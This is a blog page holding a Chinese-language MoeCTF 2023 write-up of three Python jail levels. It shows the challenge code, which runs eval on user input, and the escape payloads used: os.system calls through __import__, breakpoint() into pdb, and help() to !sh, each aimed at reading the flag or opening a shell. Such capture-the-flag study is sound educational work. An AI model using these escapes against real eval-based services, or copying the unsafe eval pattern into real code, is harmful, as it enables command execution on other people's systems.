@@ -1,0 +1,561 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>moectf | 花开再美，怎如初见..?</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Jail[PyJail] python沙箱逃逸探究·总览（HNCTF题解） - 知乎 (zhihu.com) Bypass Python sandboxes - HackTricks — 绕过 Python 沙箱 - HackTricks CTF Pyjail 沙箱逃逸绕过合集 - 先知社区 (aliyun.com) jail level 0第一次接触python沙盒，先了解一些基础的知识   H">
+<meta property="og:type" content="article">
+<meta property="og:title" content="moectf">
+<meta property="og:url" content="https://wuming.github.io/2023/10/10/moectf/index.html">
+<meta property="og:site_name" content="花开再美，怎如初见..?">
+<meta property="og:description" content="Jail[PyJail] python沙箱逃逸探究·总览（HNCTF题解） - 知乎 (zhihu.com) Bypass Python sandboxes - HackTricks — 绕过 Python 沙箱 - HackTricks CTF Pyjail 沙箱逃逸绕过合集 - 先知社区 (aliyun.com) jail level 0第一次接触python沙盒，先了解一些基础的知识   H">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.1t1vuf648xwg.webp">
+<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.1igtu8neq2m8.webp">
+<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.3xkm16wsss20.png">
+<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.4kgd10c9cmc0.webp">
+<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.39u5399sj2k0.webp">
+<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.4fn9frtsv1u0.png">
+<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.3h3ka2vwfmw0.webp">
+<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.epnkcgdi1lk.webp">
+<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.3mxe1lqm8780.webp">
+<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.2b4by3jjufa.png">
+<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.4l3ehlj1qrs0.webp">
+<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.6cm88qnam5o0.png">
+<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.xy90ifuyfn4.webp">
+<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.539slc36hjk0.webp">
+<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.rcgjxlmdfxc.webp">
+<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.156e4evvp0dc.webp">
+<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.6yf32v4l2k80.webp">
+<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.66dmrtb4xdo0.webp">
+<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.7kikqsr971g0.webp">
+<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.75dyzhgenmc0.webp">
+<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.2ban0s7byzrw.webp">
+<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.35v9q3am0wo0.webp">
+<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.68bfyu9qv240.webp">
+<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.710x6km40ns0.webp">
+<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.1y2yk0m3v0v4.webp">
+<meta property="og:image" content="https://uploader.shimo.im/f/ugqnlZvDfD07Ok7r.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTcwOTIxOTAsImZpbGVHVUlEIjoiMTZxOE1sMmFqUkZsMGFrNyIsImlhdCI6MTY5NzA5MTg5MCwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo4NTMwNjgyNn0.j617JLzCUeglnHIFCn7P5vJvbMP6E3K2bjpGv-1cNc0">
+<meta property="og:image" content="https://uploader.shimo.im/f/xp4GMcBPmsv4tHpE.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTcwOTIxOTAsImZpbGVHVUlEIjoiMTZxOE1sMmFqUkZsMGFrNyIsImlhdCI6MTY5NzA5MTg5MCwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo4NTMwNjgyNn0.j617JLzCUeglnHIFCn7P5vJvbMP6E3K2bjpGv-1cNc0">
+<meta property="og:image" content="https://uploader.shimo.im/f/LoBqZZI5JKEsHZTF.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTcwOTIxOTAsImZpbGVHVUlEIjoiMTZxOE1sMmFqUkZsMGFrNyIsImlhdCI6MTY5NzA5MTg5MCwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo4NTMwNjgyNn0.j617JLzCUeglnHIFCn7P5vJvbMP6E3K2bjpGv-1cNc0">
+<meta property="og:image" content="https://uploader.shimo.im/f/Ou6kePLwJWx3nIue.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTcwOTIxOTAsImZpbGVHVUlEIjoiMTZxOE1sMmFqUkZsMGFrNyIsImlhdCI6MTY5NzA5MTg5MCwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo4NTMwNjgyNn0.j617JLzCUeglnHIFCn7P5vJvbMP6E3K2bjpGv-1cNc0">
+<meta property="article:published_time" content="2023-10-10T01:16:18.000Z">
+<meta property="article:modified_time" content="2023-10-13T08:01:20.853Z">
+<meta property="article:author" content="wuming">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.1t1vuf648xwg.webp">
+  
+    <link rel="alternative" href="/atom.xml" title="花开再美，怎如初见..?" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+
+  
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+				<img lazy-src="https://cdn.jsdelivr.net/gh/shenshuoyaoyouguangha/blogimg@master/202308172157431.png" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+			<h1 class="header-author"><a href="/">wuming</a></h1>
+		</hgroup>
+
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">Home</a></li>
+				        
+							<li><a href="/archives">Archives</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="half-header-menu">
+						<a class="hide">Home</a>
+						<a>Tags</a>
+						<a>Links</a>
+						<a>About</a>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+								<a class="github" target="_blank" href="https://github.com/shenshuoyaoyouguangha" title="github">github</a>
+					        
+								<a class="mail" target="_blank" href="mailto:2993669760@qq.com" title="mail">mail</a>
+					        
+								<a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
+					        
+						</div>
+						<!-- music -->
+						
+							<!-- <div style="position: absolute; bottom: 120px; left: auto; width: 85%;"> -->
+							<div style="position: absolute; left: auto; width: 85%;">
+								<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=220 height=86 src="//music.163.com/outchain/player?type=2&id=1397345903&auto=1&height=66"></iframe>
+							</div>
+						
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						<a href="/tags/Pwn/" style="font-size: 10px;">Pwn</a> <a href="/tags/RE/" style="font-size: 10px;">RE</a> <a href="/tags/WEB/" style="font-size: 10px;">WEB</a> <a href="/tags/Web/" style="font-size: 10px;">Web</a> <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/litctf/" style="font-size: 10px;">litctf</a> <a href="/tags/pwn/" style="font-size: 10px;">pwn</a> <a href="/tags/re/" style="font-size: 10px;">re</a> <a href="/tags/write-up/" style="font-size: 10px;">write up</a>
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="/null">github</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+				
+				<section class="switch-part switch-part4">
+				
+					<div id="js-aboutme">一名正在学习的ctfer...</div>
+				</section>
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide"></h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="https://cdn.jsdelivr.net/gh/shenshuoyaoyouguangha/blogimg@master/202308172157431.png" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author"></h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">Home</a></li>
+		        
+					<li><a href="/archives">Archives</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+						<a class="github" target="_blank" href="https://github.com/shenshuoyaoyouguangha" title="github">github</a>
+			        
+						<a class="mail" target="_blank" href="mailto:2993669760@qq.com" title="mail">mail</a>
+			        
+						<a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
+			        
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="post-moectf" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2023/10/10/moectf/" class="article-date">
+  	<time datetime="2023-10-10T01:16:18.000Z" itemprop="datePublished">2023-10-10</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      moectf
+      
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Jail"><a href="#Jail" class="headerlink" title="Jail"></a>Jail</h1><p>[<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/578966149">PyJail] python沙箱逃逸探究·总览（HNCTF题解） - 知乎 (zhihu.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes">Bypass Python sandboxes - HackTricks — 绕过 Python 沙箱 - HackTricks</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12647#toc-23">CTF Pyjail 沙箱逃逸绕过合集 - 先知社区 (aliyun.com)</a></p>
+<h2 id="jail-level-0"><a href="#jail-level-0" class="headerlink" title="jail level 0"></a>jail level 0</h2><p>第一次接触python沙盒，先了解一些基础的知识</p>
+<blockquote>
+<p> Hey Guys,I think maybe this is your first encounter with the Jail challenge.<br> Here is a brief description of the Jail challenge                                                                                                  </p>
+<blockquote>
+<p>  Your commands and code will run in a restricted environment you need to find a way to bypass the restricted environment to get the flags       </p>
+</blockquote>
+<p> Well, as you can see this challenge is a pyjail challenge and uses a menu where you can select functions based on relevant options.<br> For example, type g to get the source code of the challenge, e to enter the challenge, c to get the description of the challenge, q to exit<br> The following description is unique to the Challenge Description function of the terminal                                                          </p>
+<p> I’m glad you understood the purpose of the menu and managed to get here, and I’m sure you’ve read the source code, but if you’re not familiar<br> with python, I’d recommend checking out <a target="_blank" rel="noopener" href="https://docs.python.org/3/">https://docs.python.org/3/</a> and <a target="_blank" rel="noopener" href="https://www.runoob.com/python3/python3-tutorial.html">https://www.runoob.com/python3/python3-tutorial.html</a> first.<br> The function of the code is probably that you can type in some arithmetic expression, like 1+1 and he’ll give you 2 back.But your goal is to get<br> flag use it. </p>
+</blockquote>
+<p>这里推荐的网站是，很好用</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes">Bypass Python sandboxes - HackTricks — 绕过 Python 沙箱 - HackTricks</a></p>
+</blockquote>
+<p>做题目的过程就是首先先G，获取题目源代码，然后进行E进入挑战，成功绕过各种限制后就可以得到flag</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">| Options: </span><br><span class="line">|	[G]et Challenge Source Code </span><br><span class="line">|	[E]nter into Challenge </span><br><span class="line">|	[C]hallenge Description </span><br><span class="line">|	[Q]uit </span><br></pre></td></tr></table></figure>
+
+<p>我们按G可以看到源码就是这样，没有任何限制</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the MoeCTF2023 Jail challenge.It&#x27;s time to work on this calc challenge.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line">user_input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;calc Answer: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">eval</span>(user_input_data)))</span><br></pre></td></tr></table></figure>
+
+<p>但同样的，他没有执行我们命令的库，引用网站的第一句</p>
+<p>Command Execution Libraries</p>
+<blockquote>
+<p>The first thing you need to know is if you can directly execute code with some already imported library, or if you could import any of these libraries:</p>
+</blockquote>
+<p>我们直接看源码是没有发现我们需要执行函数所需要的库的，那我们直接导入然后执行</p>
+<blockquote>
+<p><strong>import</strong>(“os”).system(“cat flag”)<br>flag{U45lmeD5YgYUy3VtI5Y0l1rJ-qYp9DCg}</p>
+</blockquote>
+<h2 id="jail-level-1"><a href="#jail-level-1" class="headerlink" title="jail level 1"></a>jail level 1</h2><p>我们直接查看源码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the MoeCTF2023 Jail challenge level1.It&#x27;s time to work on this calc challenge.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line">user_input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(user_input_data)&gt;<span class="number">12</span>:</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;Oh hacker! Bye~&quot;</span>)</span><br><span class="line">  exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;calc Answer: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">eval</span>(user_input_data)))</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，他的限制就多了一条字节数不能大于12而已，那么我们可以使用</p>
+<p>breakpoint()就会进到Pdb里面。</p>
+<blockquote>
+<p>pdb 模块定义了一个交互式源代码调试器，用于 Python 程序。它支持在源码行间设置（有条件的）断点和单步执行，检视堆栈帧，列出源码列表，以及在任何堆栈帧的上下文中运行任意 Python 代码。它还支持事后调试，可以在程序控制下调用。</p>
+</blockquote>
+<p>只要我们进入了pdb模式，就可以进行一句话RCE了</p>
+<p>（还有一种方法是使用help() -&gt; os -&gt; !sh，但这个题目不行，不知道为什么）</p>
+<blockquote>
+<p>breakpoint()</p>
+<p><strong>import</strong>(“os”).system(“sh”)</p>
+</blockquote>
+<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.1t1vuf648xwg.webp"></p>
+<h2 id="jail-level-2"><a href="#jail-level-2" class="headerlink" title="jail level 2"></a>jail level 2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the MoeCTF2023 Jail challenge level1.It&#x27;s time to work on this calc challenge.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line">user_input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(user_input_data)&gt;<span class="number">6</span>:</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;Oh hacker! Bye~&quot;</span>)</span><br><span class="line">  exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;calc Answer: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">eval</span>(user_input_data)))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>我们可以看到正好就用到了我们上一个挑战没用到的help（）方法</p>
+<blockquote>
+<p>help() -&gt; os -&gt; !sh</p>
+</blockquote>
+<blockquote>
+<p>help()<br>help&gt; modules<br>help&gt; antigravity<br>@ → &#x2F;bin&#x2F;sh<br>&#x2F;bin&#x2F;sh 1&gt;&amp;2<br>reset<br>cat .passwd</p>
+</blockquote>
+<p>使用help（）进入help的终端界面，就可以看到很多模块，我们选择os模块，然后在终端输入!sh就可以进入shell了，之后直接cat flag即可，我们顺便也可以看一下他的源代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line">WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  __  __  ___        _____        _        _                _                         _                _ ___  </span></span><br><span class="line"><span class="string"> |  \/  |/ _ \      / ____| ____ | |      | |              (_)                       | |              | |__ \ </span></span><br><span class="line"><span class="string"> | \  / | | | | ___| |     / __ \| | ___  | |__   ___  __ _ _ _ __  _ __   ___ _ __  | | _____   _____| |  ) |</span></span><br><span class="line"><span class="string"> | |\/| | | | |/ _ \ |    / / _` | |/ __| | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__| | |/ _ \ \ / / _ \ | / / </span></span><br><span class="line"><span class="string"> | |  | | |_| |  __/ |___| | (_| | | (__  | |_) |  __/ (_| | | | | | | | |  __/ |    | |  __/\ V /  __/ |/ /_ </span></span><br><span class="line"><span class="string"> |_|  |_|\___/ \___|\_____\ \__,_|_|\___| |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|    |_|\___| \_/ \___|_|____|</span></span><br><span class="line"><span class="string">                           \____/                      __/ |                                                  </span></span><br><span class="line"><span class="string">                                                      |___/                                                                                                                         </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">CHALLENGE_SOURCE_CODE = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">print(&quot;Welcome to the MoeCTF2023 Jail challenge level1.It&#x27;s time to work on this calc challenge.&quot;)</span></span><br><span class="line"><span class="string">print(&quot;Enter your expression and I will evaluate it for you.&quot;)</span></span><br><span class="line"><span class="string">user_input_data = input(&quot;&gt; &quot;)</span></span><br><span class="line"><span class="string">if len(user_input_data)&gt;6:</span></span><br><span class="line"><span class="string">  print(&quot;Oh hacker! Bye~&quot;)</span></span><br><span class="line"><span class="string">  exit(0)</span></span><br><span class="line"><span class="string">print(&#x27;calc Answer: &#123;&#125;&#x27;.format(eval(user_input_data)))</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">CHALLENGE_DESCRIPT = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||</span></span><br><span class="line"><span class="string">|                                                                                                                                                    |</span></span><br><span class="line"><span class="string">| Hey Guys,I think maybe this is your first encounter with the Jail challenge.                                                                       |</span></span><br><span class="line"><span class="string">| Here is a brief description of the Jail challenge                                                                                                  |</span></span><br><span class="line"><span class="string">| &gt;   Your commands and code will run in a restricted environment you need to find a way to bypass the restricted environment to get the flags       |</span></span><br><span class="line"><span class="string">|                                                                                                                                                    |</span></span><br><span class="line"><span class="string">| Well, as you can see this challenge is a pyjail challenge and uses a menu where you can select functions based on relevant options.                |</span></span><br><span class="line"><span class="string">| For example, type g to get the source code of the challenge, e to enter the challenge, c to get the description of the challenge, q to exit        | </span></span><br><span class="line"><span class="string">| The following description is unique to the Challenge Description function of the terminal                                                          |</span></span><br><span class="line"><span class="string">|                                                                                                                                                    |</span></span><br><span class="line"><span class="string">| I&#x27;m glad you understood the purpose of the menu and managed to get here, and I&#x27;m sure you&#x27;ve read the source code, but if you&#x27;re not familiar      |    </span></span><br><span class="line"><span class="string">| with python, I&#x27;d recommend checking out https://docs.python.org/3/ and https://www.runoob.com/python3/python3-tutorial.html first.                 |</span></span><br><span class="line"><span class="string">| The function of the code is probably that you can type in some arithmetic expression, like 1+1 and he&#x27;ll give you 2 back.But your goal is to get   |</span></span><br><span class="line"><span class="string">| flag use it.                                                                                                                                       |</span></span><br><span class="line"><span class="string">|                                                                                                                                                    |</span></span><br><span class="line"><span class="string">||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">CHALLENGE_HINT_FOR_BEGINNER = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||</span></span><br><span class="line"><span class="string">|                                                                                                                                                    |</span></span><br><span class="line"><span class="string">| Hint for beginner:                                                                                                                                 |</span></span><br><span class="line"><span class="string">| 1. you need to find a payload not above 6 byte                                                                                                     |</span></span><br><span class="line"><span class="string">| 2. the docker file use socat. the EXEC arg is --&gt; `EXEC:&quot;./xxxxxxx.py&quot;,pty,......`                                                                 |</span></span><br><span class="line"><span class="string">|                                                                                                                                                    |</span></span><br><span class="line"><span class="string">||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(WELCOME)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;| Options: \n|\t[G]et Challenge Source Code \n|\t[E]nter into Challenge \n|\t[C]hallenge Description \n|\t[Q]uit \n\t&quot;</span>)</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">  choice = <span class="built_in">input</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>).lower().strip()</span><br><span class="line">  <span class="keyword">if</span> choice == <span class="string">&#x27;g&#x27;</span>:</span><br><span class="line">      <span class="built_in">print</span>(CHALLENGE_SOURCE_CODE)</span><br><span class="line">  <span class="keyword">elif</span> choice == <span class="string">&#x27;e&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Welcome to the MoeCTF2023 Jail challenge.It&#x27;s time to work on this calc challenge.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line">    user_input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(user_input_data)&gt;<span class="number">6</span>:</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&quot;Oh hacker! Bye~&quot;</span>)</span><br><span class="line">      exit(<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Answer result: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">eval</span>(user_input_data)))</span><br><span class="line">  <span class="keyword">elif</span> choice == <span class="string">&quot;c&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(CHALLENGE_DESCRIPT)</span><br><span class="line">    user_input_hint_choice = <span class="built_in">input</span>(<span class="string">&quot;If you still don&#x27;t know how to solve it,do you need some hint? (y/n) &gt; &quot;</span>).lower().strip()</span><br><span class="line">    <span class="keyword">if</span> user_input_hint_choice == <span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">      <span class="built_in">print</span>(CHALLENGE_HINT_FOR_BEGINNER)</span><br><span class="line">    <span class="keyword">if</span> user_input_hint_choice == <span class="string">&#x27;n&#x27;</span>:</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&quot;Good luck!&quot;</span>)</span><br><span class="line">  <span class="keyword">elif</span> choice == <span class="string">&#x27;q&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bye~~~&quot;</span>)</span><br><span class="line">    quit()</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;You should select valid choice!&quot;</span>)</span><br></pre></td></tr></table></figure>
+
